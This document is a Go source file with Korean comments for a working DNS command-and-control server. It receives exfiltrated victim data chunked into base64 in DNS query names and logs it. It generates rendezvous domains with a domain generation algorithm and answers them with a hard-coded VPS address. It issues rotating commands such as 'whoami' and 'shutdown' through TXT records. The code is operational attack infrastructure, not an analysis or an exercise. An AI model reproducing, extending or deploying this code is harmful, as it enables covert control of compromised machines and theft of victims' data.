package main

import (
	"fmt"
	"log"
	"net"
	"os"
	"strings"
	"time"

	"github.com/miekg/dns"
)

const (
	listenAddr = ":53"
	logPath    = "/root/dns-c2/logs/raw/dns_query.log"
	vpsIP      = "178.128.53.254" // 여기에 실제 VPS 공인 IP 입력
)

var (
	config = map[int]struct {
		seed  int
		shift int
		mod   int
		tlds  []string
	}{
		1: {62, 7, 8, []string{"ml", "org", "net", "com", "pw", "eu", "in", "us"}},
	}
	fixedDomain = "main.pintruder.com"
	commands    = map[string]string{"default": "whoami"}
)

// 비트 회전 함수
func ror32(v, s uint32) uint32 {
	v &= 0xFFFFFFFF
	return (v >> s) | (v << (32 - s)) & 0xFFFFFFFF
}

func rol32(v, s uint32) uint32 {
	return (v << s) | (v >> (32 - s)) & 0xFFFFFFFF
}

// DGA 함수 (3주 주기)
func dga(date time.Time, configNr, domainNr int) string {
	c := config[configNr]
	period := date.Year()*1000 + (int(date.Month())-1)*30 + (date.Day() / 21)
	t := ror32(0xB11924E1*uint32(period+0x1BF5), uint32(c.shift))

	if c.seed != 0 {
		t = ror32(0xB11924E1*(t+uint32(c.seed)+0x27100001), uint32(c.shift))
	}

	t = ror32(0xB11924E1*(t+uint32(date.Day()/2)+0x27100001), uint32(c.shift))
	t = ror32(0xB11924E1*(t+uint32(date.Month())+0x2709A354), uint32(c.shift))

	nr := rol32(uint32(domainNr%c.mod), 21)
	s := rol32(uint32(c.seed), 17)

	r := (ror32(0xB11924E1*(nr+t+s+0x27100001), uint32(c.shift)) + 0x27100001) & 0xFFFFFFFF
	length := (r % 11) + 5

	domain := ""
	for i := 0; i < int(length); i++ {
		r = (ror32(0xB11924E1*rol32(r, uint32(i)), uint32(c.shift)) + 0x27100001) & 0xFFFFFFFF
		domain += string(r%25 + 'a')
	}

	domain += "."
	r = ror32(r*0xB11924E1, uint32(c.shift))
	tldI := ((r + 0x27100001) & 0xFFFFFFFF) % uint32(len(c.tlds))
	domain += c.tlds[tldI]

	return domain
}

// 명령 업데이트
func updateCommands() {
	cmdList := []string{"whoami", "shutdown", "status"}
	idx := 0
	for {
		time.Sleep(60 * time.Second)
		commands["default"] = cmdList[idx%len(cmdList)]
		log.Printf("명령 업데이트: %s", commands["default"])
		idx++
	}
}

func handleRequest(w dns.ResponseWriter, r *dns.Msg) {
    msg := new(dns.Msg)
    msg.SetReply(r)

    for _, q := range r.Question {
        qname := strings.ToLower(q.Name)
        fmt.Printf("[+] 수신 질의: %s\n", qname)

        parts := strings.Split(qname, ".")
        if len(parts) >= 4 {
            chunkIdx, victim, b64 := parts[0], parts[1], parts[2]
            logEntry := fmt.Sprintf("%s | CHUNK:%s | VICTIM:%s | B64:%s",
                time.Now().Format(time.RFC3339), chunkIdx, victim, b64)
            saveLog(logEntry)
            fmt.Println(logEntry)
        }

        now := time.Now().UTC()
        validDomains := make([]string, 0, 21)
        for i := 0; i < 20; i++ {
            validDomains = append(validDomains, dga(now, 1, i))
        }
        validDomains = append(validDomains, fixedDomain)
        validDomains = append(validDomains, "pintruder.com") // pintruder.com 추가

        if contains(validDomains, strings.TrimSuffix(qname, ".")) {
            if q.Qtype == dns.TypeA {
                a := &dns.A{
                    Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: 0},
                    A:   net.ParseIP(vpsIP),
                }
                msg.Answer = append(msg.Answer, a)
            } else if q.Qtype == dns.TypeTXT {
                txt := &dns.TXT{
                    Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: 60},
                    Txt: []string{commands["default"]},
                }
                msg.Answer = append(msg.Answer, txt)
            }
        } else {
            msg.SetRcode(r, dns.RcodeNameError)
        }
    }

    _ = w.WriteMsg(msg)
}

func saveLog(entry string) {
	f, err := os.OpenFile(logPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Printf("[!] 로그 파일 열기 실패: %v", err)
		return
	}
	defer f.Close()
	f.WriteString(entry + "\n")
}

func contains(slice []string, item string) bool {
	for _, s := range slice {
		if s == item {
			return true
		}
	}
	return false
}

func main() {
	dns.HandleFunc(".", handleRequest)

	go updateCommands()

	server := &dns.Server{Addr: listenAddr, Net: "udp"}
	fmt.Println("[+] DNS C2 서버 실행 중 (UDP 53)...")
	err := server.ListenAndServe()
	if err != nil {
		log.Fatalf("[!] DNS 서버 시작 실패: %v", err)
	}
}
